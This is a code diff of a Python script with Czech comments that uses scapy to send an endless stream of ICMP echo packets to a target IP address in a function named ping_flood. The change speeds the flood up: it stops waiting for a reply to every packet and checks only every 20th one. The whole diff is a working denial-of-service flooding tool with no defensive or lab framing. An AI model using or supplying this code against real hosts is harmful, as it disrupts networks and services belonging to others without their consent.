@@ -1,5 +1,5 @@
 import threading
-from scapy.all import IP, ICMP, sr1
+from scapy.all import IP, ICMP, sr1, send
 import time
 
 # Funkce pro odesílání nekonečného množství pingů a vypisování výsledků
@@ -8,21 +8,40 @@ def ping_flood(target_ip):
     global running
     running = True
 
-    # Funkce, která bude odesílat pings
+    # # Funkce pro pingflood
+    # def send_pings():
+    #     while running:
+    #         # Vytvoření ICMP (ping) zprávy
+    #         packet = IP(dst=target_ip)/ICMP()
+    #         try:
+    #             # Odešli paket a čekej na odpověď
+    #             response = sr1(packet, verbose=False, timeout=1) 
+    #             if response:
+    #                 print(f"Odpověď od {response.src}: {response.summary()}")
+    #             else:
+    #                 print(f"Žádná odpověď od {target_ip}")
+    #         except Exception as e:
+    #             print(f"Chyba při odesílání paketu: {e}")
+    
     def send_pings():
+        counter = 0
         while running:
-            # Vytvoření ICMP (ping) zprávy
             packet = IP(dst=target_ip)/ICMP()
             try:
-                # Odešli paket a čekej na odpověď
-                response = sr1(packet, verbose=False, timeout=1) 
-                if response:
-                    print(f"Odpověď od {response.src}: {response.summary()}")
+                if counter % 20 == 0:  # Každý 20. paket se bude čekat na odpověď
+                    response = sr1(packet, verbose=False, timeout=1)
+                    if response:
+                        print(f"Odpověď od {response.src}: {response.summary()}")
+                    else:
+                        print(f"Žádná odpověď od {target_ip}")
                 else:
-                    print(f"Žádná odpověď od {target_ip}")
+                    send(packet, verbose=False)
+                
+                counter += 1
             except Exception as e:
                 print(f"Chyba při odesílání paketu: {e}")
-    
+
+
     # Vytvoření vlákna pro odesílání pingů
     ping_thread = threading.Thread(target=send_pings)
     ping_thread.start()
